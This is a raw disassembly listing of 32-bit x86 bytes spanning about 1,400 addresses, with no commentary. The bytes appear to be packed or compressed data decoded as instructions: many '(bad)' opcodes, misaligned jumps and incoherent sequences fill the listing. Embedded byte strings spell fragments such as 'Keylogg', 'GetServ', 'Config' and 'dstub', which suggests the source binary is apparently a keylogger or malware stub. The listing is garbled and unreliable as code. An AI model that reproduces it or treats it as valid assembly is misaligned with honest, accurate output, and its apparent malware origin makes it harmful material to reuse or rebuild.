1315cf36:	14 66                	adc    $0x66,%al
1315cf38:	e5 6e                	in     $0x6e,%eax
1315cf3a:	aa                   	stos   %al,%es:(%edi)
1315cf3b:	03 c4                	add    %esp,%eax
1315cf3d:	89 09                	mov    %ecx,(%ecx)
1315cf3f:	4f                   	dec    %edi
1315cf40:	48                   	dec    %eax
1315cf41:	95                   	xchg   %eax,%ebp
1315cf42:	00 71 23             	add    %dh,0x23(%ecx)
1315cf45:	4b                   	dec    %ebx
1315cf46:	15 a1 42 80 eb       	adc    $0xeb8042a1,%eax
1315cf4b:	f3 17                	repz pop %ss
1315cf4d:	81 72 5f 99 f7 6c 00 	xorl   $0x6cf799,0x5f(%edx)
1315cf54:	6c                   	insb   (%dx),%es:(%edi)
1315cf55:	82 9d 25 84 11 e7 3b 	sbbb   $0x3b,-0x18ee7bdb(%ebp)
1315cf5c:	cb                   	lret
1315cf5d:	ae                   	scas   %es:(%edi),%al
1315cf5e:	d8 28                	fsubrs (%eax)
1315cf60:	3c a0                	cmp    $0xa0,%al
1315cf62:	3d 23 16 23 8b       	cmp    $0x8b231623,%eax
1315cf67:	62 64 73 21          	bound  %esp,0x21(%ebx,%esi,2)
1315cf6b:	85 68 74             	test   %ebp,0x74(%eax)
1315cf6e:	65 2a 45 56          	sub    %gs:0x56(%ebp),%al
1315cf72:	2d 27 01 90 a5       	sub    $0xa5900127,%eax
1315cf77:	b2 c7                	mov    $0xc7,%dl
1315cf79:	00 8d 9a 6c a1 99    	add    %cl,-0x665e9366(%ebp)
1315cf7f:	40                   	inc    %eax
1315cf80:	c6                   	(bad)
1315cf81:	32 0f                	xor    (%edi),%cl
1315cf83:	c0 0e 73             	rorb   $0x73,(%esi)
1315cf86:	04 a3                	add    $0xa3,%al
1315cf88:	03 01                	add    (%ecx),%eax
1315cf8a:	1b e2                	sbb    %edx,%esp
1315cf8c:	b6 44                	mov    $0x44,%dh
1315cf8e:	75 f4                	jne    0x1315cf84
1315cf90:	1e                   	push   %ds
1315cf91:	4c                   	dec    %esp
1315cf92:	20 03                	and    %al,(%ebx)
1315cf94:	04 24                	add    $0x24,%al
1315cf96:	fd                   	std
1315cf97:	ff                   	(bad)
1315cf98:	ff b7 27 cb cc c8    	push   -0x373334d9(%edi)
1315cf9e:	c9                   	leave
1315cf9f:	d7                   	xlat   %ds:(%ebx)
1315cfa0:	cf                   	iret
1315cfa1:	c8 cd ce db          	enter  $0xcecd,$0xdb
1315cfa5:	d8 da                	fcomp  %st(2)
1315cfa7:	d9 ca                	fxch   %st(2)
1315cfa9:	dc dd                	(bad)
1315cfab:	de df                	(bad)
1315cfad:	e0 e1                	loopne 0x1315cf90
1315cfaf:	e3 00                	jecxz  0x1315cfb1
1315cfb1:	e4 e5                	in     $0xe5,%al
1315cfb3:	e3 ad                	jecxz  0x1315cf62
1315cfb5:	d0 d8                	rcr    $1,%al
1315cfb7:	2f                   	das
1315cfb8:	45                   	inc    %ebp
1315cfb9:	72 51                	jb     0x1315d00c
1315cfbb:	4d                   	dec    %ebp
1315cfbc:	47                   	inc    %edi
1315cfbd:	52                   	push   %edx
1315cfbe:	75 6e                	jne    0x1315d02e
1315cfc0:	51                   	push   %ecx
1315cfc1:	20 ff                	and    %bh,%bh
1315cfc3:	be 65 6d 65 0f       	mov    $0xf656d65,%esi
1315cfc8:	20 00                	and    %al,(%eax)
1315cfca:	61                   	popa
1315cfcb:	74 20                	je     0x1315cfed
1315cfcd:	30 15 9c 0a ba 1f    	xor    %dl,0x1fba0a9c
1315cfd3:	30 a6 e2 20 e1 37    	xor    %ah,0x37e120e2(%esi)
1315cfd9:	bc 41 42 43 44       	mov    $0x44434241,%esp
1315cfde:	45                   	inc    %ebp
1315cfdf:	46                   	inc    %esi
1315cfe0:	4b                   	dec    %ebx
1315cfe1:	08 de                	or     %bl,%dh
1315cfe3:	b2 94                	mov    $0x94,%dl
1315cfe5:	b5 db                	mov    $0xdb,%ch
1315cfe7:	14 a7                	adc    $0xa7,%al
1315cfe9:	03 fb                	add    %ebx,%edi
1315cfeb:	5c                   	pop    %esp
1315cfec:	f4                   	hlt
1315cfed:	a8 07                	test   $0x7,%al
1315cfef:	47                   	inc    %edi
1315cff0:	01 20                	add    %esp,(%eax)
1315cff2:	5f                   	pop    %edi
1315cff3:	0d 0d 0d 95 77       	or     $0x77950d0d,%eax
1315cff8:	4c                   	dec    %esp
1315cff9:	b1 50                	mov    $0x50,%cl
1315cffb:	c3                   	ret
1315cffc:	4f                   	dec    %edi
1315cffd:	14 c2                	adc    $0xc2,%al
1315cfff:	1a 0e                	sbb    (%esi),%cl
1315d001:	eb af                	jmp    0x1315cfb2
1315d003:	5d                   	pop    %ebp
1315d004:	17                   	pop    %ss
1315d005:	31 b0 60 5d 53 4e    	xor    %esi,0x4e535d60(%eax)
1315d00b:	1f                   	pop    %ds
1315d00c:	62 f7 4e a0 ef       	(bad)
1315d011:	03 21                	add    (%ecx),%esp
1315d013:	54                   	push   %esp
1315d014:	f9                   	stc
1315d015:	56                   	push   %esi
1315d016:	05 37 6c e6 5e       	add    $0x5ee66c37,%eax
1315d01b:	47                   	inc    %edi
1315d01c:	55                   	push   %ebp
1315d01d:	41                   	inc    %ecx
1315d01e:	46                   	inc    %esi
1315d01f:	0b 2f                	or     (%edi),%ebp
1315d021:	39 1f                	cmp    %ebx,(%edi)
1315d023:	04 09                	add    $0x9,%al
1315d025:	7b 2b                	jnp    0x1315d052
1315d027:	9b                   	fwait
1315d028:	00 94 e6 42 03 46 ed 	add    %dl,-0x12b9fcbe(%esi,%eiz,8)
1315d02f:	4b                   	dec    %ebx
1315d030:	a0 d6 eb ba ae       	mov    0xaebaebd6,%al
1315d035:	c0 40 77 a8          	rolb   $0xa8,0x77(%eax)
1315d039:	bc 13 9c 18 08       	mov    $0x8189c13,%esp
1315d03e:	47                   	inc    %edi
1315d03f:	61                   	popa
1315d040:	d8 47 70             	fadds  0x70(%edi)
1315d043:	4d                   	dec    %ebp
1315d044:	d7                   	xlat   %ds:(%ebx)
1315d045:	50                   	push   %eax
1315d046:	09 c8                	or     %ecx,%eax
1315d048:	2b 10                	sub    (%eax),%edx
1315d04a:	c4 07                	les    (%edi),%eax
1315d04c:	20 0c 85 a3 cd a0 18 	and    %cl,0x18a0cda3(,%eax,4)
1315d053:	08 47 61             	or     %al,0x61(%edi)
1315d056:	8f                   	(bad)
1315d057:	f2 36 80 0c d7 15    	repnz orb $0x15,%ss:(%edi,%edx,8)
1315d05d:	e8 24 1b 88 40       	call   0x539deb86
1315d062:	11 80 25 c4 2b 22    	adc    %eax,0x222bc425(%eax)
1315d068:	20 24 a1             	and    %ah,(%ecx,%eiz,4)
1315d06b:	00 2a                	add    %ch,(%edx)
1315d06d:	90                   	nop
1315d06e:	00 46 01             	add    %al,0x1(%esi)
1315d071:	54                   	push   %esp
1315d072:	20 8c 02 a8 40 1b 05 	and    %cl,0x51b40a8(%edx,%eax,1)
1315d079:	50                   	push   %eax
1315d07a:	81 03 f3 a1 02 20    	addl   $0x2002a1f3,(%ebx)
1315d080:	80 15 13 08 20 da 01 	adcb   $0x1,0xda200813
1315d087:	51                   	push   %ecx
1315d088:	94                   	xchg   %eax,%esp
1315d089:	5f                   	pop    %edi
1315d08a:	90                   	nop
1315d08b:	15 ac 8a 22 32       	adc    $0x32228aac,%eax
1315d090:	3f                   	aas
1315d091:	54                   	push   %esp
1315d092:	13 40 85             	adc    -0x7b(%eax),%eax
1315d095:	06                   	push   %es
1315d096:	f7 04 d5 12 69 56 bf 	testl  $0x6aa20341,-0x40a996ee(,%edx,8)
1315d09d:	41 03 a2 6a 
1315d0a1:	36 77 0b             	ss ja  0x1315d0af
1315d0a4:	00 50 07             	add    %dl,0x7(%eax)
1315d0a7:	0d 4b 47 6a 09       	or     $0x96a474b,%eax
1315d0ac:	aa                   	stos   %al,%es:(%edi)
1315d0ad:	13 9d 46 d3 06 ff    	adc    -0xf92cba(%ebp),%ebx
1315d0b3:	ff 40 88             	incl   -0x78(%eax)
1315d0b6:	b3 26                	mov    $0x26,%bl
1315d0b8:	3d 4f 38 c2 82       	cmp    $0x82c2384f,%eax
1315d0bd:	37                   	aaa
1315d0be:	b8 f3 24 42 03       	mov    $0x34224f3,%eax
1315d0c3:	17                   	pop    %ss
1315d0c4:	9b                   	fwait
1315d0c5:	ff cd                	dec    %ebp
1315d0c7:	d3 c1                	rol    %cl,%ecx
1315d0c9:	3a 83 0d cc 0e 01    	cmp    0x10ecc0d(%ebx),%al
1315d0cf:	64 73 74             	fs jae 0x1315d146
1315d0d2:	75 62                	jne    0x1315d136
1315d0d4:	00 10                	add    %dl,(%eax)
1315d0d6:	55                   	push   %ebp
1315d0d7:	cd 76                	int    $0x76
1315d0d9:	79 fb                	jns    0x1315d0d6
1315d0db:	54                   	push   %esp
1315d0dc:	79 70                	jns    0x1315d14e
1315d0de:	65 73 10             	gs jae 0x1315d0f1
1315d0e1:	c7                   	(bad)
1315d0e2:	53                   	push   %ebx
1315d0e3:	79 65                	jns    0x1315d14a
1315d0e5:	6d                   	insl   (%dx),%es:(%edi)
1315d0e6:	08 81 49 ad fd dd    	or     %al,-0x220252b7(%ecx)
1315d0ec:	ed                   	in     (%dx),%eax
1315d0ed:	6e                   	outsb  %ds:(%esi),(%dx)
1315d0ee:	69 74 09 fe 55 06 47 	imul   $0x65470655,-0x2(%ecx,%ecx,1),%esi
1315d0f5:	65 
1315d0f6:	74 53                	je     0x1315d14b
1315d0f8:	65 72 76             	gs jb  0x1315d171
1315d0fb:	02 0f                	add    (%edi),%cl
1315d0fd:	8a ea                	mov    %dl,%ch
1315d0ff:	f6 9f 85 43 6f 6e    	negb   0x6e6f4385(%edi)
1315d105:	66 69 67 30 0c 4b    	imul   $0x4b0c,0x30(%edi),%sp
1315d10b:	48                   	dec    %eax
1315d10c:	14 b1                	adc    $0xb1,%al
1315d10e:	cd 2e                	int    $0x2e
1315d110:	17                   	pop    %ss
1315d111:	32 3e                	xor    (%esi),%bh
1315d113:	e4 f9                	in     $0xf9,%al
1315d115:	9f                   	lahf
1315d116:	6d                   	insl   (%dx),%es:(%edi)
1315d117:	33 cf                	xor    %edi,%ecx
1315d119:	4b                   	dec    %ebx
1315d11a:	65 79 6c             	gs jns 0x1315d189
1315d11d:	6f                   	outsl  %ds:(%esi),(%dx)
1315d11e:	67 67 a6             	addr16 cmpsb %es:(%di),%ds:(%si)
1315d121:	67 db 6e 6d          	fldt   0x6d(%bp)
1315d125:	72 63                	jb     0x1315d18a
1315d127:	45                   	inc    %ebp
1315d128:	74 72                	je     0x1315d19c
1315d12a:	30 67 11             	xor    %ah,0x11(%edi)
1315d12d:	e2 3b                	loop   0x1315d16a
1315d12f:	6c                   	insb   (%dx),%es:(%edi)
1315d130:	52                   	push   %edx
1315d131:	54                   	push   %esp
1315d132:	65 59                	gs pop %ecx
1315d134:	b2 13                	mov    $0x13,%dl
1315d136:	e7 9e                	out    %eax,$0x9e
1315d138:	c9                   	leave
1315d139:	3e 6a 65             	ds push $0x65
1315d13c:	63 6c 59 42          	arpl   %ebp,0x42(%ecx,%ebx,2)
1315d140:	62 1f                	bound  %ebx,(%edi)
1315d142:	7f d7                	jg     0x1315d11b
1315d144:	7e c9                	jle    0x1315d10f
1315d146:	87 50 72             	xchg   %edx,0x72(%eax)
1315d149:	6f                   	outsl  %ds:(%esi),(%dx)
1315d14a:	63 af 7f 1d 99 57    	arpl   %ebp,0x57991d7f(%edi)
1315d150:	41                   	inc    %ecx
1315d151:	78 b7                	js     0x1315d10a
1315d153:	be ff ff ff ff       	mov    $0xffffffff,%esi
1315d158:	4e                   	dec    %esi
1315d159:	a0 17 2a af 90       	mov    0x90af2a17,%al
1315d15e:	48                   	dec    %eax
1315d15f:	81 f9 7f d3 1c 8c    	cmp    $0x8c1cd37f,%ecx
1315d165:	11 69 cf             	adc    %ebp,-0x31(%ecx)
1315d168:	19 1f                	sbb    %ebx,(%edi)
1315d16a:	34 f7                	xor    $0xf7,%al
1315d16c:	4d                   	dec    %ebp
1315d16d:	36 3e 0c 15          	ss ds or $0x15,%al
1315d171:	6e                   	outsb  %ds:(%esi),(%dx)
1315d172:	41                   	inc    %ecx
1315d173:	89 f0                	mov    %esi,%eax
1315d175:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315d176:	06                   	push   %es
1315d177:	8e ff                	mov    %edi,%?
1315d179:	ff                   	(bad)
1315d17a:	ff                   	(bad)
1315d17b:	ff 05 58 ba be 72    	incl   0x72beba58
1315d181:	1e                   	push   %ds
1315d182:	42                   	inc    %edx
1315d183:	5d                   	pop    %ebp
1315d184:	33 06                	xor    (%esi),%eax
1315d186:	d5 42                	aad    $0x42
1315d188:	95                   	xchg   %eax,%ebp
1315d189:	6b 3b 4e             	imul   $0x4e,(%ebx),%edi
1315d18c:	47                   	inc    %edi
1315d18d:	fa                   	cli
1315d18e:	f5                   	cmc
1315d18f:	45                   	inc    %ebp
1315d190:	ca 2c 90             	lret   $0x902c
1315d193:	3b ce                	cmp    %esi,%ecx
1315d195:	e4 28                	in     $0x28,%al
1315d197:	53                   	push   %ebx
1315d198:	23 75 27             	and    0x27(%ebp),%esi
1315d19b:	76 ff                	jbe    0x1315d19c
1315d19d:	ff                   	(bad)
1315d19e:	ff                   	(bad)
1315d19f:	ff ad fe 41 c3 a7    	ljmp   *-0x583cbe02(%ebp)
1315d1a5:	bf 83 ab a1 0c       	mov    $0xca1ab83,%edi
1315d1aa:	54                   	push   %esp
1315d1ab:	ee                   	out    %al,(%dx)
1315d1ac:	7b b3                	jnp    0x1315d161
1315d1ae:	c2 85 46             	ret    $0x4685
1315d1b1:	14 39                	adc    $0x39,%al
1315d1b3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315d1b4:	1a 52 a7             	sbb    -0x59(%edx),%dl
1315d1b7:	b9 11 b3 c5 ec       	mov    $0xecc5b311,%ecx
1315d1bc:	93                   	xchg   %eax,%ebx
1315d1bd:	0c 56                	or     $0x56,%al
1315d1bf:	f4                   	hlt
1315d1c0:	ff                   	(bad)
1315d1c1:	ff                   	(bad)
1315d1c2:	ff                   	(bad)
1315d1c3:	ff 06                	incl   (%esi)
1315d1c5:	e7 30                	out    %eax,$0x30
1315d1c7:	57                   	push   %edi
1315d1c8:	96                   	xchg   %eax,%esi
1315d1c9:	aa                   	stos   %al,%es:(%edi)
1315d1ca:	63 02                	arpl   %eax,(%edx)
1315d1cc:	70 eb                	jo     0x1315d1b9
1315d1ce:	8c ba a6 4a e4 1c    	mov    %?,0x1ce44aa6(%edx)
1315d1d4:	5b                   	pop    %ebx
1315d1d5:	cb                   	lret
1315d1d6:	53                   	push   %ebx
1315d1d7:	36 90                	ss nop
1315d1d9:	99                   	cltd
1315d1da:	b0 71                	mov    $0x71,%al
1315d1dc:	29 7f b5             	sub    %edi,-0x4b(%edi)
1315d1df:	3b 79 5d             	cmp    0x5d(%ecx),%edi
1315d1e2:	2b 56 ff             	sub    -0x1(%esi),%edx
1315d1e5:	ff                   	(bad)
1315d1e6:	ff                   	(bad)
1315d1e7:	ff 4f d3             	decl   -0x2d(%edi)
1315d1ea:	d2 cf                	ror    %cl,%bh
1315d1ec:	12 71 2e             	adc    0x2e(%ecx),%dh
1315d1ef:	64 c2 d0 bd          	fs ret $0xbdd0
1315d1f3:	cc                   	int3
1315d1f4:	9a 25 38 a6 ff fe 3d 	lcall  $0x3dfe,$0xffa63825
1315d1fb:	c9                   	leave
1315d1fc:	70 4e                	jo     0x1315d24c
1315d1fe:	07                   	pop    %es
1315d1ff:	2c e7                	sub    $0xe7,%al
1315d201:	15 b5 cc 5d 66       	adc    $0x665dccb5,%eax
1315d206:	0a af ff ff ff ff    	or     -0x1(%edi),%ch
1315d20c:	a3 e3 67 3a a8       	mov    %eax,0xa83a67e3
1315d211:	74 bf                	je     0x1315d1d2
1315d213:	9f                   	lahf
1315d214:	e1 f8                	loope  0x1315d20e
1315d216:	1a 15 e5 92 4e ba    	sbb    0xba4e92e5,%dl
1315d21c:	30 e5                	xor    %ah,%ch
1315d21e:	ca 89 52             	lret   $0x5289
1315d221:	3d 78 6b 7d 98       	cmp    $0x987d6b78,%eax
1315d226:	99                   	cltd
1315d227:	3a 61 bb             	cmp    -0x45(%ecx),%ah
1315d22a:	6d                   	insl   (%dx),%es:(%edi)
1315d22b:	ed                   	in     (%dx),%eax
1315d22c:	ff                   	(bad)
1315d22d:	bf fd ff 9d 9e       	mov    $0x9e9dfffd,%edi
1315d232:	84 86 07 8b f7 36    	test   %al,0x36f78b07(%esi)
1315d238:	ac                   	lods   %ds:(%esi),%al
1315d239:	fa                   	cli
1315d23a:	aa                   	stos   %al,%es:(%edi)
1315d23b:	1b e7                	sbb    %edi,%esp
1315d23d:	ab                   	stos   %eax,%es:(%edi)
1315d23e:	76 e4                	jbe    0x1315d224
1315d240:	e1 48                	loope  0x1315d28a
1315d242:	da 73 70             	fidivl 0x70(%ebx)
1315d245:	16                   	push   %ss
1315d246:	fb                   	sti
1315d247:	b2 2f                	mov    $0x2f,%dl
1315d249:	4a                   	dec    %edx
1315d24a:	95                   	xchg   %eax,%ebp
1315d24b:	c0 85 17 fe ff c4 45 	rolb   $0x45,-0x3b0001e9(%ebp)
1315d252:	1b da                	sbb    %edx,%ebx
1315d254:	cb                   	lret
1315d255:	5a                   	pop    %edx
1315d256:	a1 a6 f7 17 7b       	mov    0x7b17f7a6,%eax
1315d25b:	53                   	push   %ebx
1315d25c:	fc                   	cld
1315d25d:	b2 03                	mov    $0x3,%dl
1315d25f:	bd 72 c4 4b 2b       	mov    $0x2b4bc472,%ebp
1315d264:	ff                   	(bad)
1315d265:	ff                   	(bad)
1315d266:	ff                   	(bad)
1315d267:	ff 18                	lcall  *(%eax)
1315d269:	df 55 ae             	fists  -0x52(%ebp)
1315d26c:	fa                   	cli
1315d26d:	88 c8                	mov    %cl,%al
1315d26f:	9f                   	lahf
1315d270:	ac                   	lods   %ds:(%esi),%al
1315d271:	5f                   	pop    %edi
1315d272:	c7                   	(bad)
1315d273:	0e                   	push   %cs
1315d274:	92                   	xchg   %eax,%edx
1315d275:	69 42 ef 8b f5 d9 03 	imul   $0x3d9f58b,-0x11(%edx),%eax
1315d27c:	bb 7e 45 71 b2       	mov    $0xb271457e,%ebx
1315d281:	02 dc                	add    %ah,%bl
1315d283:	aa                   	stos   %al,%es:(%edi)
1315d284:	5f                   	pop    %edi
1315d285:	f9                   	stc
1315d286:	0b 12                	or     (%edx),%edx
1315d288:	ff                   	(bad)
1315d289:	ff                   	(bad)
1315d28a:	ff                   	(bad)
1315d28b:	ff e3                	jmp    *%ebx
1315d28d:	a1 91 eb 24 c4       	mov    0xc424eb91,%eax
1315d292:	30 e9                	xor    %ch,%cl
1315d294:	df b5 fb ee 1d 12    	fbstp  0x121deefb(%ebp)
1315d29a:	f4                   	hlt
1315d29b:	43                   	inc    %ebx
1315d29c:	81 3c 7a f2 e6 fe cb 	cmpl   $0xcbfee6f2,(%edx,%edi,2)
1315d2a3:	22 d7                	and    %bh,%dl
1315d2a5:	3e 39 1f             	cmp    %ebx,%ds:(%edi)
1315d2a8:	ea 2e 67 37 ff 85 ff 	ljmp   $0xff85,$0xff37672e
1315d2af:	ff e6                	jmp    *%esi
1315d2b1:	31 ab 54 b2 96 75    	xor    %ebp,0x7596b254(%ebx)
1315d2b7:	fe                   	(bad)
1315d2b8:	28 7d 09             	sub    %bh,0x9(%ebp)
1315d2bb:	bc 7d 32 bb ba       	mov    $0xbabb327d,%esp
1315d2c0:	3b cb                	cmp    %ebx,%ecx
1315d2c2:	66 89 8f 70 58 44 a3 	mov    %cx,-0x5cbba790(%edi)
1315d2c9:	5e                   	pop    %esi
1315d2ca:	ff                   	(bad)
1315d2cb:	ff                   	(bad)
1315d2cc:	ff                   	(bad)
1315d2cd:	ff 01                	incl   (%ecx)
1315d2cf:	92                   	xchg   %eax,%edx
1315d2d0:	20 41 5d             	and    %al,0x5d(%ecx)
1315d2d3:	7d d4                	jge    0x1315d2a9
1315d2d5:	cd e4                	int    $0xe4
1315d2d7:	75 0d                	jne    0x1315d2e6
1315d2d9:	43                   	inc    %ebx
1315d2da:	30 ed                	xor    %ch,%ch
1315d2dc:	2d 58 1f 73 d4       	sub    $0xd4731f58,%eax
1315d2e1:	bd c5 ea 63 57       	mov    $0x5763eac5,%ebp
1315d2e6:	9e                   	sahf
1315d2e7:	61                   	popa
1315d2e8:	7f 30                	jg     0x1315d31a
1315d2ea:	8e b3 6a 98 ff ff    	mov    -0x6796(%ebx),%?
1315d2f0:	ff                   	(bad)
1315d2f1:	ff 86 5d 84 2c 8e    	incl   -0x71d37ba3(%esi)
1315d2f7:	80 2c e3 15          	subb   $0x15,(%ebx,%eiz,8)
1315d2fb:	49                   	dec    %ecx
1315d2fc:	3e d8 46 84          	fadds  %ds:-0x7c(%esi)
1315d300:	ae                   	scas   %es:(%edi),%al
1315d301:	2c 98                	sub    $0x98,%al
1315d303:	4a                   	dec    %edx
1315d304:	5e                   	pop    %esi
1315d305:	ef                   	out    %eax,(%dx)
1315d306:	7b ec                	jnp    0x1315d2f4
1315d308:	13 d9                	adc    %ecx,%ebx
1315d30a:	c6                   	(bad)
1315d30b:	b5 46                	mov    $0x46,%ch
1315d30d:	54                   	push   %esp
1315d30e:	ce                   	into
1315d30f:	0b 02                	or     (%edx),%eax
1315d311:	42                   	inc    %edx
1315d312:	ff                   	(bad)
1315d313:	ff                   	(bad)
1315d314:	ff                   	(bad)
1315d315:	ff d3                	call   *%ebx
1315d317:	ea bb 72 e8 7d 11 0d 	ljmp   $0xd11,$0x7de872bb
1315d31e:	b4 05                	mov    $0x5,%ah
1315d320:	24 cd                	and    $0xcd,%al
1315d322:	1c 1e                	sbb    $0x1e,%al
1315d324:	95                   	xchg   %eax,%ebp
1315d325:	bb 43 75 9e 93       	mov    $0x939e7543,%ebx
1315d32a:	16                   	push   %ss
1315d32b:	53                   	push   %ebx
1315d32c:	c3                   	ret
1315d32d:	de 34 95 c2 2b ca b8 	fidivs -0x4735d43e(,%edx,4)
1315d334:	b7 f4                	mov    $0xf4,%bh
1315d336:	ff                   	(bad)
1315d337:	ff                   	(bad)
1315d338:	ff                   	lcall  (bad)
1315d339:	db 49 ad             	fisttpl -0x53(%ecx)
1315d33c:	fe                   	(bad)
1315d33d:	2d 67 6e b4 9e       	sub    $0x9eb46e67,%eax
1315d342:	22 11                	and    (%ecx),%dl
1315d344:	20 55 65             	and    %dl,0x65(%ebp)
1315d347:	d5 cb                	aad    $0xcb
1315d349:	1b 87 3b 97 7d 88    	sbb    -0x778268c5(%edi),%eax
1315d34f:	bb ce 40 0c a3       	mov    $0xa30c40ce,%ebx
1315d354:	f6 1c 1b             	negb   (%ebx,%ebx,1)
1315d357:	05 f0 ff 32 57       	add    $0x5732fff0,%eax
1315d35c:	97                   	xchg   %eax,%edi
1315d35d:	46                   	inc    %esi
1315d35e:	d3 1d f9 9d 08 60    	rcrl   %cl,0x60089df9
1315d364:	0e                   	push   %cs
1315d365:	6b cc b5             	imul   $0xffffffb5,%esp,%ecx
1315d368:	ff                   	(bad)
1315d369:	ff                   	(bad)
1315d36a:	ff                   	(bad)
1315d36b:	ff                   	lcall  (bad)
1315d36c:	d9 d2                	(bad)
1315d36e:	49                   	dec    %ecx
1315d36f:	40                   	inc    %eax
1315d370:	ec                   	in     (%dx),%al
1315d371:	05 55 7a 12 ae       	add    $0xae127a55,%eax
1315d376:	4e                   	dec    %esi
1315d377:	2f                   	das
1315d378:	e7 4c                	out    %eax,$0x4c
1315d37a:	59                   	pop    %ecx
1315d37b:	6d                   	insl   (%dx),%es:(%edi)
1315d37c:	b9 e0 ad 89 0c       	mov    $0xc89ade0,%ecx
1315d381:	cc                   	int3
1315d382:	5e                   	pop    %esi
1315d383:	be 05 84 d3 0d       	mov    $0xdd38405,%esi
1315d388:	c0 06 18             	rolb   $0x18,(%esi)
1315d38b:	75 ff                	jne    0x1315d38c
1315d38d:	ff                   	(bad)
1315d38e:	ff                   	(bad)
1315d38f:	ff 84 dc 4f 32 60 88 	incl   -0x779fcdb1(%esp,%ebx,8)
1315d396:	38 12                	cmp    %dl,(%edx)
1315d398:	75 4d                	jne    0x1315d3e7
1315d39a:	a8 9e                	test   $0x9e,%al
1315d39c:	1d 33 ed 86 c6       	sbb    $0xc686ed33,%eax
1315d3a1:	f9                   	stc
1315d3a2:	6b 33 38             	imul   $0x38,(%ebx),%esi
1315d3a5:	4f                   	dec    %edi
1315d3a6:	7e 6d                	jle    0x1315d415
1315d3a8:	c5 11                	lds    (%ecx),%edx
1315d3aa:	67 04 40             	addr16 add $0x40,%al
1315d3ad:	9b                   	fwait
1315d3ae:	1b b6 ff ff ff ff    	sbb    -0x1(%esi),%esi
1315d3b4:	f2 5e                	repnz pop %esi
1315d3b6:	5d                   	pop    %ebp
1315d3b7:	cd 89                	int    $0x89
1315d3b9:	02 9f 1b 86 0b c4    	add    -0x3bf479e5(%edi),%bl
1315d3bf:	02 3d 36 82 85 ed    	add    0xed858236,%bh
1315d3c5:	4d                   	dec    %ebp
1315d3c6:	b6 c7                	mov    $0xc7,%dh
1315d3c8:	96                   	xchg   %eax,%esi
1315d3c9:	cb                   	lret
1315d3ca:	1c f7                	sbb    $0xf7,%al
1315d3cc:	7c 01                	jl     0x1315d3cf
1315d3ce:	28 02                	sub    %al,(%edx)
1315d3d0:	85 4d c4             	test   %ecx,-0x3c(%ebp)
1315d3d3:	86 ff                	xchg   %bh,%bh
1315d3d5:	ff                   	(bad)
1315d3d6:	ff b7 48 3e 47 92    	push   -0x6db8c1b8(%edi)
1315d3dc:	d4 8a                	aam    $0x8a
1315d3de:	c5 fe 8f             	(bad)
1315d3e1:	7b 7f                	jnp    0x1315d462
1315d3e3:	03 a8 ff 50 0b 4e    	add    0x4e0b50ff(%eax),%ebp
1315d3e9:	32 a3 bb a9 73 61    	xor    0x6173a9bb(%ebx),%ah
1315d3ef:	6b 07 4f             	imul   $0x4f,(%edi),%eax
1315d3f2:	bb d6 ff ff ff       	mov    $0xffffffd6,%ebx
1315d3f7:	ff c4                	inc    %esp
1315d3f9:	e2 03                	loop   0x1315d3fe
1315d3fb:	0c 66                	or     $0x66,%al
1315d3fd:	a2 1b e2 af d7       	mov    %al,0xd7afe21b
1315d402:	70 36                	jo     0x1315d43a
1315d404:	8f                   	(bad)
1315d405:	f4                   	hlt
1315d406:	ae                   	scas   %es:(%edi),%al
1315d407:	58                   	pop    %eax
1315d408:	40                   	inc    %eax
1315d409:	73 46                	jae    0x1315d451
1315d40b:	85 16                	test   %edx,(%esi)
1315d40d:	48                   	dec    %eax
1315d40e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315d40f:	4d                   	dec    %ebp
1315d410:	5f                   	pop    %edi
1315d411:	75 bc                	jne    0x1315d3cf
1315d413:	24 a6                	and    $0xa6,%al
1315d415:	86 92 81 ed ff ff    	xchg   %dl,-0x127f(%edx)
1315d41b:	ff a0 38 69 e4 c8    	jmp    *-0x371b96c8(%eax)
1315d421:	ec                   	in     (%dx),%al
1315d422:	f9                   	stc
1315d423:	9e                   	sahf
1315d424:	9d                   	popf
1315d425:	b3 61                	mov    $0x61,%bl
1315d427:	a1 17 ff 9e 04       	mov    0x49eff17,%eax
1315d42c:	07                   	pop    %es
1315d42d:	6b 6a f8 7c          	imul   $0x7c,-0x8(%edx),%ebp
1315d431:	4b                   	dec    %ebx
1315d432:	3c 98                	cmp    $0x98,%al
1315d434:	d9 b4 0b 52 fb ff ff 	fnstenv -0x4ae(%ebx,%ecx,1)
1315d43b:	ff 70 fc             	push   -0x4(%eax)
1315d43e:	1b 4c 8d f3          	sbb    -0xd(%ebp,%ecx,4),%ecx
1315d442:	4a                   	dec    %edx
1315d443:	43                   	inc    %ebx
1315d444:	38 34 2a             	cmp    %dh,(%edx,%ebp,1)
1315d447:	24 f5                	and    $0xf5,%al
1315d449:	61                   	popa
1315d44a:	3a 78 73             	cmp    0x73(%eax),%bh
1315d44d:	32 d4                	xor    %ah,%dl
1315d44f:	1f                   	pop    %ds
1315d450:	bb b7 a7 d6 38       	mov    $0x38d6a7b7,%ebx
1315d455:	11 09                	adc    %ecx,(%ecx)
1315d457:	47                   	inc    %edi
1315d458:	2c ea                	sub    $0xea,%al
1315d45a:	04 fc                	add    $0xfc,%al
1315d45c:	ff                   	(bad)
1315d45d:	7f c9                	jg     0x1315d428
1315d45f:	50                   	push   %eax
1315d460:	14 86                	adc    $0x86,%al
1315d462:	2c 6b                	sub    $0x6b,%al
1315d464:	c7                   	(bad)
1315d465:	11 65 37             	adc    %esp,0x37(%ebp)
1315d468:	52                   	push   %edx
1315d469:	85 ec                	test   %ebp,%esp
1315d46b:	6f                   	outsl  %ds:(%esi),(%dx)
1315d46c:	7d f8                	jge    0x1315d466
1315d46e:	eb 82                	jmp    0x1315d3f2
1315d470:	a2 05 ff ff f6       	mov    %al,0xf6ffff05
1315d475:	42                   	inc    %edx
1315d476:	08 bc 48 e8 5a 9d ea 	or     %bh,-0x1562a518(%eax,%ecx,2)
1315d47d:	e2 96                	loop   0x1315d415
1315d47f:	88 47 8b             	mov    %al,-0x75(%edi)
1315d482:	07                   	pop    %es
1315d483:	2f                   	das
1315d484:	37                   	aaa
1315d485:	47                   	inc    %edi
1315d486:	6f                   	outsl  %ds:(%esi),(%dx)
1315d487:	18 e3                	sbb    %ah,%bl
1315d489:	ce                   	into
1315d48a:	ff                   	(bad)
1315d48b:	ff                   	(bad)
1315d48c:	ff                   	(bad)
1315d48d:	ff 1b                	lcall  *(%ebx)
1315d48f:	57                   	push   %edi
